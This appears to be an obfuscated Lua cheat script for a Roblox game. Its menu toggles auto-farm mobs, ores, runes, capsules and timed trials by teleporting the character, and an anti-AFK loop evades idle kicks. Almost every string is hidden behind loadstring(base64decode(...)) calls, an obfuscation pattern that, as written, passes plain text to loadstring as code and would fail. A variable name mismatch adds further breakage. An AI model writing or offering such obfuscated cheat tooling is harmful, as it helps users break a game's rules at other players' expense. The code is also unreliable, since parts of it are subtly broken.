AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBQbGF0aW51bQ=="))(), CurrentValue = false, Callback = function(v) autoPlatinumEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBVcmFuaXVt"))(), CurrentValue = false, Callback = function(v) autoUraniumEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBDZWxlc3RpdW0="))(), CurrentValue = false, Callback = function(v) autoCelestiumEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBSdWJ5"))(), CurrentValue = false, Callback = function(v) autoRubyEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBUaXRhbml1bQ=="))(), CurrentValue = false, Callback = function(v) autoTitaniumEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBQYWxsYWRpdW0="))(), CurrentValue = false, Callback = function(v) autoPalladiumEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTaWx2ZXI="))(), CurrentValue = false, Callback = function(v) autoSilverEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBJcm9u"))(), CurrentValue = false, Callback = function(v) autoIronEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBHb2xk"))(), CurrentValue = false, Callback = function(v) autoGoldEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTdG9uZQ=="))(), CurrentValue = false, Callback = function(v) autoStoneEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb3BwZXI="))(), CurrentValue = false, Callback = function(v) autoCopperEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBBZXRoZXJpdGU="))(), CurrentValue = false, Callback = function(v) autoAetheriteEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBWb2lkc3RlZWw="))(), CurrentValue = false, Callback = function(v) autoVoidsteelEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBFbXB5cml1bQ=="))(), CurrentValue = false, Callback = function(v) autoEmpyriumEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBGcm9zdGl1bQ=="))(), CurrentValue = false, Callback = function(v) autoFrostiumEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBEcmFnb252ZWlu"))(), CurrentValue = false, Callback = function(v) autoDragonveinEnabled = v visitedOres = {} end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("SW5zdGFudCBUZWxlcG9ydCAoTWluZSk="))(), CurrentValue = false, Callback = function(v) if v then useTweenMine = false end end})
AutoMineTab:CreateToggle({Name = loadstring(base64decode("U21vb3RoIFR3ZWVuIChNaW5lKQ=="))(), CurrentValue = true, Callback = function(v) if v then useTweenMine = true end end})

RunesTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCflK4gUmVhbG0gMSDilZDilZDilZA="))())
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBCYXNpYyBSdW5l"))(), CurrentValue = false, Callback = function(v) autoBasicRuneEnabled = v end})
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTdXBlciBSdW5l"))(), CurrentValue = false, Callback = function(v) autoSuperRuneEnabled = v end})
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBBZHZhbmNlZCBSdW5l"))(), CurrentValue = false, Callback = function(v) autoAdvancedRuneEnabled = v end})
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb3NtaWMgUHJpc20gUnVuZQ=="))(), CurrentValue = false, Callback = function(v) autoCosmicPrismEnabled = v end})
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBIYWNrZXIgUnVuZQ=="))(), CurrentValue = false, Callback = function(v) autoHackerRuneEnabled = v end})
RunesTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKdhO+4jyBSZWFsbSAyIOKVkOKVkOKVkA=="))())
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTbm93eSBSdW5l"))(), CurrentValue = false, Callback = function(v) autoSnowyRuneEnabled = v end})
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBEZWVwIENvcmUgUnVuZQ=="))(), CurrentValue = false, Callback = function(v) autoDeepCoreRuneEnabled = v end})
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTaGFyZCBSdW5l"))(), CurrentValue = false, Callback = function(v) autoShardEnabled = v end})
RunesTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfj5zvuI8gUmVhbG0gMyDilZDilZDilZA="))())
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBEdW5lIFJ1bmU="))(), CurrentValue = false, Callback = function(v) autoDuneRuneEnabled = v end})
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTdW5maXJlIFJ1bmU="))(), CurrentValue = false, Callback = function(v) autoSunfireEnabled = v end})
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTdW5zdG9ybSBQcmlzbSBSdW5l"))(), CurrentValue = false, Callback = function(v) autoSunstormPrismEnabled = v end})
RunesTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfjIwgUmVhbG0gNCDilZDilZDilZA="))())
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTdGFybGlnaHQgUnVuZQ=="))(), CurrentValue = false, Callback = function(v) autoStarlightEnabled = v end})
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb3NtYSBSdW5l"))(), CurrentValue = false, Callback = function(v) autoCosmaEnabled = v end})
RunesTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKYr++4jyBZaW4gYW5kIFlhbmcg4pWQ4pWQ4pWQ"))())
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBEYXJrIFJ1bmU="))(), CurrentValue = false, Callback = function(v) autoDarkRuneEnabled = v end})
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBMaWdodCBSdW5l"))(), CurrentValue = false, Callback = function(v) autoLightRuneEnabled = v end})
RunesTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfq6cgUmVhbG0gNSDilZDilZDilZA="))())
RunesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBVbmRlcndhdGVyIFJ1bmU="))(), CurrentValue = false, Callback = function(v) autoUnderwaterEnabled = v end})
RunesTab:CreateToggle({Name = loadstring(base64decode("SW5zdGFudCBUZWxlcG9ydCAoUnVuZXMp"))(), CurrentValue = false, Callback = function(v) if v then useTweenRunes = false end end})
RunesTab:CreateToggle({Name = loadstring(base64decode("U21vb3RoIFR3ZWVuIChSdW5lcyk="))(), CurrentValue = true, Callback = function(v) if v then useTweenRunes = true end end})

CapsulesTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfk6YgQ2Fwc3VsZXMg4pWQ4pWQ4pWQ"))())
CapsulesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBDbGFzc2ljIENhcHN1bGU="))(), CurrentValue = false, Callback = function(v) autoClassicEnabled = v if v then capsulesHandled.Classic = false end end})
CapsulesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTdXBlciBDYXBzdWxl"))(), CurrentValue = false, Callback = function(v) autoSuperEnabled = v if v then capsulesHandled.Super = false end end})
CapsulesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBBbmNpZW50IENhcHN1bGU="))(), CurrentValue = false, Callback = function(v) autoAncientEnabled = v if v then capsulesHandled.Ancient = false end end})
CapsulesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb3NtaWMgQ2Fwc3VsZQ=="))(), CurrentValue = false, Callback = function(v) autoCosmicEnabled = v if v then capsulesHandled.Cosmic = false end end})
CapsulesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBZaW4gWWFuZyBDYXBzdWxl"))(), CurrentValue = false, Callback = function(v) autoYinYangEnabled = v if v then capsulesHandled[loadstring(base64decode("WWluIFlhbmc="))()] = false end end})
CapsulesTab:CreateToggle({Name = loadstring(base64decode("QXV0byBGb290YmFsbCBDYXBzdWxl"))(), CurrentValue = false, Callback = function(v) autoFootballEnabled = v if v then capsulesHandled.Football = false end end})
CapsulesTab:CreateToggle({Name = loadstring(base64decode("SW5zdGFudCBUZWxlcG9ydCAoQ2Fwc3VsZXMp"))(), CurrentValue = false, Callback = function(v) if v then useTweenCapsules = false end end})
CapsulesTab:CreateToggle({Name = loadstring(base64decode("U21vb3RoIFR3ZWVuIChDYXBzdWxlcyk="))(), CurrentValue = true, Callback = function(v) if v then useTweenCapsules = true end end})

TrialTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfm6HvuI8gVHJpYWxzIOKVkOKVkOKVkA=="))())
TrialTab:CreateDropdown({
    Name = loadstring(base64decode("U2VsZWN0IFRyaWFsIERpZmZpY3VsdHk="))(),
    Options = {loadstring(base64decode("RWFzeQ=="))(), loadstring(base64decode("TWVkaXVt"))(), loadstring(base64decode("SGFyZA=="))(), loadstring(base64decode("RXh0cmVtZQ=="))()},
    CurrentOption = {loadstring(base64decode("SGFyZA=="))()},
    Callback = function(option)
        if type(option) == loadstring(base64decode("dGFibGU="))() then selectedTrial = option[1] or loadstring(base64decode("SGFyZA=="))()
        else selectedTrial = option or loadstring(base64decode("SGFyZA=="))() end
    end,
})
TrialTab:CreateToggle({
    Name = loadstring(base64decode("QXV0byBUcmlhbCAoRW50ZXIgKyBDaGFpbik="))(),
    CurrentValue = false,
    Callback = function(v)
        enabled = v
        hasTeleportedThisCycle = false
        visitedTrialMobs = {}
        lastTrialWaveSeen = 0
        if not v then inTrial = false postTrialMode = false end
    end,
})
TrialTab:CreateSlider({Name = loadstring(base64decode("TGVhdmUgYXQgV2F2ZQ=="))(), Range = {1, 200}, Increment = 5, CurrentValue = 10, Callback = function(v) leaveAtWave = v end})
TrialTab:CreateToggle({Name = loadstring(base64decode("QXV0byBMZWF2ZSBUcmlhbA=="))(), CurrentValue = false, Callback = function(v) autoLeaveTrial = v end})
TrialTab:CreateToggle({
    Name = loadstring(base64decode("QXV0byBQbGF5IEFmdGVyIFRyaWFs"))(),
    CurrentValue = false,
    Callback = function(v) autoPlayAfterTrial = v if not v then postTrialMode = false end end
})
TrialTab:CreateToggle({Name = loadstring(base64decode("QXV0byBPcGVuIFQxIFRyaWFsIENoZXN0"))(), CurrentValue = false, Callback = function(v) autoT1ChestEnabled = v end})
TrialTab:CreateToggle({Name = loadstring(base64decode("QXV0byBUMiBUcmlhbCBDaGVzdA=="))(), CurrentValue = false, Callback = function(v) autoT2ChestEnabled = v end})
local StatusLabel = TrialTab:CreateLabel(loadstring(base64decode("U3RhdHVzOiBSZWFkeQ=="))())
TrialTab:CreateLabel(loadstring(base64decode("S2lsbHMgb25seSBhbGl2ZSBtb2JzIOKAoiBjbGVhcnMgd2F2ZSDihpIgbmV4dCBpbnN0YW50bHk="))())
TrialTab:CreateToggle({Name = loadstring(base64decode("SW5zdGFudCBUZWxlcG9ydCAoVHJpYWwp"))(), CurrentValue = true, Callback = function(v) if v then useTweenTrial = false end end})
TrialTab:CreateToggle({Name = loadstring(base64decode("U21vb3RoIFR3ZWVuIChUcmlhbCk="))(), CurrentValue = false, Callback = function(v) if v then useTweenTrial = true end end})

SettingsTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKaoSBTcGVlZHMg4pWQ4pWQ4pWQ"))())
SettingsTab:CreateSlider({Name = loadstring(base64decode("VHJpYWwgVHdlZW4gU3BlZWQ="))(), Range = {0.1, 10}, Increment = 0.1, CurrentValue = 1.0, Callback = function(v) glideSpeed = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("TW9iIFR3ZWVuIFNwZWVk"))(), Range = {0.1, 10}, Increment = 0.1, CurrentValue = 1.0, Callback = function(v) autoMobSpeed = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("UmVhcGVyIE5vb2IgVHdlZW4gU3BlZWQ="))(), Range = {0.1, 10}, Increment = 0.1, CurrentValue = 1.0, Callback = function(v) reaperMobSpeed = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("TWluZSBUd2VlbiBTcGVlZA=="))(), Range = {0.1, 10}, Increment = 0.1, CurrentValue = 1.0, Callback = function(v) autoMineSpeed = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("U3RhciBUd2VlbiBTcGVlZA=="))(), Range = {0.1, 10}, Increment = 0.1, CurrentValue = 1.0, Callback = function(v) starCollectSpeed = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("T3lzdGVycyBUcmVuY2ggU3BlZWQ="))(), Range = {0.05, 1.5}, Increment = 0.05, CurrentValue = 0.25, Callback = function(v) trenchTweenSpeed = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("Q29yYWwgQ29sbGVjdCBEZWxheQ=="))(), Range = {0.05, 1.5}, Increment = 0.05, CurrentValue = 0.35, Callback = function(v) coralCollectDelay = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("Q2hhcmlvdCBTdGFydCBEZWxheQ=="))(), Range = {0.5, 1.5}, Increment = 0.05, CurrentValue = 0.75, Callback = function(v) chariotStartDelay = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("TGlnaHRuaW5nIFRocm93IERlbGF5"))(), Range = {0.05, 2.5}, Increment = 0.05, CurrentValue = 0.5, Callback = function(v) lightningThrowDelay = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("Q29sb3NzZXVtIFdhdmUgKMOXMTAp"))(), Range = {1, 650}, Increment = 10, CurrentValue = 20, Callback = function(v)
    selectedColosseumWave = math.clamp(math.floor(v), 1, 650)
    selectColosseumWave(selectedColosseumWave)
end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("VXBncmFkZSAvIFJhbmsgRGVsYXk="))(), Range = {0.2, 2.0}, Increment = 0.05, CurrentValue = 0.55, Callback = function(v) upgradeSeqDelay = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("VHJpYWwgSW5zdGFudCBEZWxheQ=="))(), Range = {0.02, 0.5}, Increment = 0.02, CurrentValue = 0.08, Callback = function(v) instantTrialDelay = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("TW9iIEluc3RhbnQgRGVsYXk="))(), Range = {0.05, 1.5}, Increment = 0.05, CurrentValue = 0.25, Callback = function(v) instantMobDelay = v end})
SettingsTab:CreateSlider({Name = loadstring(base64decode("TWluZSBJbnN0YW50IERlbGF5"))(), Range = {0.05, 1.5}, Increment = 0.05, CurrentValue = 0.25, Callback = function(v) instantMineDelay = v end})

SettingsTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfm6HvuI8gQW50aSBBRksgLyBBbnRpIExhZyDilZDilZDilZA="))())
SettingsTab:CreateToggle({Name = loadstring(base64decode("QW50aSBBRksgKEFudGkgS2ljayk="))(), CurrentValue = false, Callback = function(v) antiAFKEnabled = v end})
SettingsTab:CreateToggle({
    Name = loadstring(base64decode("QW50aSBMYWc="))(),
    CurrentValue = false,
    Callback = function(v)
        antiLagEnabled = v
        if v then
            pcall(function()
                settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
                local Lighting = game:GetService(loadstring(base64decode("TGlnaHRpbmc="))())
                Lighting.GlobalShadows = false
                Lighting.FogEnd = 9e9
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA(loadstring(base64decode("UGFydGljbGVFbWl0dGVy"))()) or obj:IsA(loadstring(base64decode("VHJhaWw="))()) or obj:IsA(loadstring(base64decode("U21va2U="))()) or obj:IsA(loadstring(base64decode("RmlyZQ=="))()) then
                        obj.Enabled = false
                    end
                end
            end)
        end
    end
})

player.Idled:Connect(function()
    if antiAFKEnabled then
        pcall(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end
end)

task.spawn(function()
    while true do
        if antiAFKEnabled then
            pcall(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end)
        end
        if antiLagEnabled then
            pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
        end
        task.wait(25)
    end
end)

local function nameMatches(mobName)
    local lower = string.lower(mobName)
    return (autoOrcEnabled and lower == loadstring(base64decode("b3Jj"))()) or (autoGoblinEnabled and lower == loadstring(base64decode("Z29ibGlu"))())
        or (autoWarriorEnabled and lower == loadstring(base64decode("d2Fycmlvcg=="))()) or (autoNinjaEnabled and lower == loadstring(base64decode("bmluamE="))())
        or (autoPirateEnabled and lower == loadstring(base64decode("cGlyYXRl"))()) or (autoSamuraiEnabled and lower == loadstring(base64decode("c2FtdXJhaQ=="))())
        or (autoDarkCommanderEnabled and lower == loadstring(base64decode("ZGFyayBjb21tYW5kZXI="))())
        or (autoPirateCaptainEnabled and lower == loadstring(base64decode("cGlyYXRlIGNhcHRhaW4="))())
        or (autoPirateAdmiralEnabled and lower == loadstring(base64decode("cGlyYXRlIGFkbWlyYWw="))())
        or (autoSamuraiMasterEnabled and lower == loadstring(base64decode("c2FtdXJhaSBtYXN0ZXI="))())
        or (autoDarkKnightEnabled and lower == loadstring(base64decode("ZGFyayBrbmlnaHQ="))())
end

local function anyMobSelected()
    return autoOrcEnabled or autoGoblinEnabled or autoWarriorEnabled or autoNinjaEnabled
        or autoPirateEnabled or autoSamuraiEnabled or autoDarkCommanderEnabled
        or autoPirateCaptainEnabled or autoPirateAdmiral
        or autoSamuraiMasterEnabled or autoDarkKnightEnabled
end

local function nameMatchesOre(oreName)
    local lower = string.lower(oreName)
    return (autoCoalEnabled and lower == loadstring(base64decode("Y29hbA=="))()) or (autoPlatinumEnabled and lower == loadstring(base64decode("cGxhdGludW0="))())
        or (autoUraniumEnabled and lower == loadstring(base64decode("dXJhbml1bQ=="))()) or (autoCelestiumEnabled and lower == loadstring(base64decode("Y2VsZXN0aXVt"))())
        or (autoRubyEnabled and lower == loadstring(base64decode("cnVieQ=="))()) or (autoTitaniumEnabled and lower == loadstring(base64decode("dGl0YW5pdW0="))())
        or (autoPalladiumEnabled and lower == loadstring(base64decode("cGFsbGFkaXVt"))()) or (autoSilverEnabled and lower == loadstring(base64decode("c2lsdmVy"))())
        or (autoIronEnabled and lower == loadstring(base64decode("aXJvbg=="))()) or (autoGoldEnabled and lower == loadstring(base64decode("Z29sZA=="))())
        or (autoStoneEnabled and lower == loadstring(base64decode("c3RvbmU="))()) or (autoCopperEnabled and lower == loadstring(base64decode("Y29wcGVy"))())
        or (autoAetheriteEnabled and lower == loadstring(base64decode("YWV0aGVyaXRl"))()) or (autoVoidsteelEnabled and lower == loadstring(base64decode("dm9pZHN0ZWVs"))())
        or (autoEmpyriumEnabled and lower == loadstring(base64decode("ZW1weXJpdW0="))()) or (autoFrostiumEnabled and lower == loadstring(base64decode("ZnJvc3RpdW0="))())
        or (autoDragonveinEnabled and lower == loadstring(base64decode("ZHJhZ29udmVpbg=="))())
end

local function anyOreSelected()
    return autoCoalEnabled or autoPlatinumEnabled or autoUraniumEnabled or autoCelestiumEnabled
        or autoRubyEnabled or autoTitaniumEnabled or autoPalladiumEnabled or autoSilverEnabled
        or autoIronEnabled or autoGoldEnabled or autoStoneEnabled or autoCopperEnabled
        or autoAetheriteEnabled or autoVoidsteelEnabled
        or autoEmpyriumEnabled or autoFrostiumEnabled or autoDragonveinEnabled
end

local isRunningMobs = false
task.spawn(function()
    while true do
        if anyMobSelected() and not isRunningMobs then
            isRunningMobs = true
            while anyMobSelected() do
                local targets = {}
                local mobsFolder = workspace:FindFirstChild(loadstring(base64decode("X19HQU1FX0NPTlRFTlQ="))()) and workspace.__GAME_CONTENT:FindFirstChild(loadstring(base64decode("TW9icw=="))())
                if mobsFolder then
                    for _, mobModel in ipairs(mobsFolder:GetChildren()) do
                        if nameMatches(mobModel.Name) then
                            local rootPart, humanoid
                            local mobChar = mobModel:FindFirstChild(loadstring(base64decode("TW9iQ2hhcmFjdGVy"))())
                            if mobChar then
                                rootPart = mobChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) or mobChar:FindFirstChild(loadstring(base64decode("VG9yc28="))()) or mobChar.PrimaryPart
                                humanoid = mobChar:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
                            end
                            if not rootPart then rootPart = mobModel:FindFirstChild(loadstring(base64decode("VkZYUGFydA=="))()) end
                            if not rootPart then
                                rootPart = mobModel:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) or mobModel.PrimaryPart or mobModel:FindFirstChildWhichIsA(loadstring(base64decode("QmFzZVBhcnQ="))())
                            end
                            if not humanoid then humanoid = mobModel:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))()) end
                            if rootPart and ((humanoid and humanoid.Health > 0) or not humanoid) then
                                local id = mobModel:GetDebugId() or tostring(mobModel)
                                if not visitedMobs[id] then
                                    table.insert(targets, {Root = rootPart, Humanoid = humanoid, ID = id})
                                end
                            end
                        end
                    end
                end
                if #targets == 0 then visitedMobs = {} task.wait(0.35)
                else
                    for _, mob in ipairs(targets) do
                        if not anyMobSelected() then break end
                        if mob.Root and mob.Root.Parent and (not mob.Humanoid or mob.Humanoid.Health > 0) then
                            visitedMobs[mob.ID] = true
                            moveTo(mob.Root.Position, autoMobSpeed, useTweenMobs)
                            task.wait(useTweenMobs and 0.12 or instantMobDelay)
                        end
                    end
                end
                task.wait(0.05)
            end
            isRunningMobs = false
            visitedMobs = {}
        end
        task.wait(0.12)
    end
end)

local isRunningMine = false
task.spawn(function()
    while true do
        if anyOreSelected() and not isRunningMine then
            isRunningMine = true
            while anyOreSelected() do
                local targets = {}
                local oresFolder = workspace:FindFirstChild(loadstring(base64decode("X19HQU1FX0NPTlRFTlQ="))()) and workspace.__GAME_CONTENT:FindFirstChild(loadstring(base64decode("T3Jlcw=="))())
                if oresFolder then
                    for _, typeFolder in ipairs(oresFolder:GetChildren()) do
                        if nameMatchesOre(typeFolder.Name) then
                            for _, desc in ipairs(typeFolder:GetDescendants()) do
                                if desc:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                                    local id = desc:GetDebugId() or tostring(desc)
                                    if not visitedOres[id] then table.insert(targets, {Part = desc, ID = id}) end
                                end
                            end
                        end
                    end
                end
                if #targets == 0 then visitedOres = {} task.wait(0.35)
                else
                    for _, data in ipairs(targets) do
                        if not anyOreSelected() then break end
                        if data.Part and data.Part.Parent then
                            visitedOres[data.ID] = true
                            moveTo(data.Part.Position, autoMineSpeed, useTweenMine)
                            task.wait(useTweenMine and 0.12 or instantMineDelay)
                        end
                    end
                end
                task.wait(0.05)
            end
            isRunningMine = false
            visitedOres = {}
        end
        task.wait(0.12)
    end
end)

task.spawn(function()
    while true do
        if autoCollectStarsEnabled then
            local root = getRoot()
            if root then
                local playerY = root.Position.Y
                local stars = {}
                pcall(function()
                    local folder = workspace:FindFirstChild(loadstring(base64decode("Q2xpZW50U3RhcnM="))())
                    if folder then
                        for _, obj in ipairs(folder:GetDescendants()) do
                            if obj:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and obj.Name == loadstring(base64decode("U3RhclBhcnQ="))() and obj.Material == Enum.Material.Neon then
                                if obj.Position.Y <= playerY + 8 then table.insert(stars, obj) end
                            end
                        end
                    end
                end)
                if #stars > 0 then
                    for _, star in ipairs(stars) do
                        if not autoCollectStarsEnabled then break end
                        if star and star.Parent then
                            moveTo(Vector3.new(star.Position.X, math.min(star.Position.Y, playerY + 2), star.Position.Z), starCollectSpeed, useTweenStars)
                            task.wait(useTweenStars and 0.1 or instantStarDelay)
                        end
                    end
                else task.wait(0.4) end
            end
        else task.wait(0.5) end
        task.wait(0.05)
    end
end)

task.spawn(function()
    while true do
        if autoCollectChipsEnabled then
            pcall(function()
                local root = getRoot()
                local chip = workspace.__GAME_CONTENT.Contents[loadstring(base64decode("V09STEQgLSA0"))()].Chips[loadstring(base64decode("MQ=="))()].Main
                if root and chip and chip:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and (root.Position - chip.Position).Magnitude > 8 then
                    root.CFrame = CFrame.new(chip.Position + Vector3.new(0, 3, 0))
                end
            end)
        end
        if autoMergeChipsEnabled then
            pcall(function()
                local root = getRoot()
                local mergeBtn = workspace.__GAME_CONTENT.Contents[loadstring(base64decode("V09STEQgLSA0"))()].Chips.ChipMergeButton
                local part = mergeBtn and (mergeBtn:FindFirstChildWhichIsA(loadstring(base64decode("QmFzZVBhcnQ="))(), true) or mergeBtn.PrimaryPart)
                if root and part and (root.Position - part.Position).Magnitude > 8 then
                    root.CFrame = CFrame.new(part.Position + Vector3.new(0, 3, 0))
                end
            end)
        end
        task.wait(0.5)
    end
end)

task.spawn(function()
    while true do
        if autoSandLayerRestart then
            local current = getCurrentSandLayer()
            if typeof(current) == loadstring(base64decode("bnVtYmVy"))() and current > 0 and current >= selectedSandLayer then
                teleportToResetSand()
                task.wait(1.8)
                teleportToSandTop()
                task.wait(2.5)
            end
        end
        task.wait(0.4)
    end
end)

local leavingInProgress = false
task.spawn(function()
    while true do
        if autoLeaveTrial and enabled and inTrial and not leavingInProgress then
            local wave = getCurrentTrialWave()
            if wave > 0 and wave >= leaveAtWave then
                leavingInProgress = true
                fireMain(loadstring(base64decode("TGVhdmVUcmlhbA=="))())
                inTrial = false
                hasTeleportedThisCycle = false
                visitedTrialMobs = {}
                lastTrialWaveSeen = 0
                StatusLabel:Set(loadstring(base64decode("U3RhdHVzOiBMZWZ0IHdhdmUg"))() .. wave)
                task.wait(5)
                if autoPlayAfterTrial then
                    postTrialMode = true
                    resumePostTrialSystems()
                end
                leavingInProgress = false
            end
        end
        task.wait(0.35)
    end
end)

task.spawn(function()
    while true do
        local root = getRoot()
        local time = os.date(loadstring(base64decode("KnQ="))())
        local m, s = time.min, time.sec
        local isTrialEntryTime = (m == 29 or m == 59) and s >= 5 and s <= 40

        if enabled and isTrialEntryTime and not hasTeleportedThisCycle then
            postTrialMode = false
            local pos = getDoorPosition()
            if pos then
                local r = getRoot()
                if r then r.CFrame = CFrame.new(pos.X, pos.Y + 3, pos.Z) end
                hasTeleportedThisCycle = true
                inTrial = true
                visitedTrialMobs = {}
                lastTrialWaveSeen = 0
                StatusLabel:Set(loadstring(base64decode("U3RhdHVzOiBFbnRlcmluZyA="))() .. selectedTrial)
            end
        end
        if enabled and (m == 30 or m == 0) and s > 45 then hasTeleportedThisCycle = false end

        if enabled then
            local wave = getCurrentTrialWave()
            if wave > 0 then
                inTrial = true
                if wave ~= lastTrialWaveSeen then
                    visitedTrialMobs = {}
                    lastTrialWaveSeen = wave
                    StatusLabel:Set(loadstring(base64decode("U3RhdHVzOiBXYXZlIA=="))() .. wave)
                end
            elseif not isTrialEntryTime and not leavingInProgress then
                inTrial = false
            end
        else
            inTrial = false
        end

        if enabled and inTrial and root then
            local alive = getAliveTrialMobs()
            if #alive > 0 then
                local myPos = root.Position
                table.sort(alive, function(a, b)
                    return (a.Root.Position - myPos).Magnitude < (b.Root.Position - myPos).Magnitude
                end)

                for _, mob in ipairs(alive) do
                    if not enabled or not inTrial then break end
                    if mob.Humanoid and mob.Humanoid.Health <= 0 then
                        visitedTrialMobs[mob.ID] = true
                    elseif mob.Root and mob.Root.Parent then
                        visitedTrialMobs[mob.ID] = true
                        if useTweenTrial then
                            moveTo(mob.Root.Position, glideSpeed, true)
                        else
                            local r = getRoot()
                            if r then
                                r.CFrame = CFrame.new(mob.Root.Position + Vector3.new(0, 3, 0))
                            end
                        end
                        task.wait(useTweenTrial and 0.08 or instantTrialDelay)
                        StatusLabel:Set(loadstring(base64decode("U3RhdHVzOiDihpIg"))() .. mob.Name)
                    end
                end
            else
                StatusLabel:Set(loadstring(base64decode("U3RhdHVzOiBXYXZlIGNsZWFyIOKGkiBuZXh0Li4u"))())
                visitedTrialMobs = {}
                task.wait(0.05)
            end
        elseif enabled then
            StatusLabel:Set(postTrialMode and loadstring(base64decode("U3RhdHVzOiBQb3N0LVRyaWFs"))() or (loadstring(base64decode("U3RhdHVzOiBXYWl0aW5nIA=="))() .. selectedTrial))
            task.wait(0.15)
        else
            StatusLabel:Set(loadstring(base64decode("U3RhdHVzOiBSZWFkeQ=="))())
            task.wait(0.2)
        end

        runEnabledCapsulesOnce()
        if autoBasicRuneEnabled then teleportToRuneZone(loadstring(base64decode("QmFzaWM="))()) task.wait(6) end
        if autoSuperRuneEnabled then teleportToRuneZone(loadstring(base64decode("U3VwZXI="))()) task.wait(6) end
        if autoAdvancedRuneEnabled then teleportToRuneZone(loadstring(base64decode("QWR2YW5jZWQ="))()) task.wait(6) end
        if autoCosmicPrismEnabled then teleportToCosmicPrism() task.wait(6) end
        if autoHackerRuneEnabled then teleportToHackerRune() task.wait(6) end
        if autoSnowyRuneEnabled then teleportToSnowyRune() task.wait(6) end
        if autoDeepCoreRuneEnabled then teleportToDeepCoreRune() task.wait(6) end
        if autoDuneRuneEnabled then teleportToDuneRune() task.wait(6) end
        if autoSunfireEnabled then teleportToSunfire() task.wait(6) end
        if autoSunstormPrismEnabled then teleportToSunstormPrism() task.wait(6) end
        if autoShardEnabled then teleportToShard() task.wait(6) end
        if autoStarlightEnabled then teleportToStarlight() task.wait(6) end
        if autoCosmaEnabled then teleportToCosma() task.wait(6) end
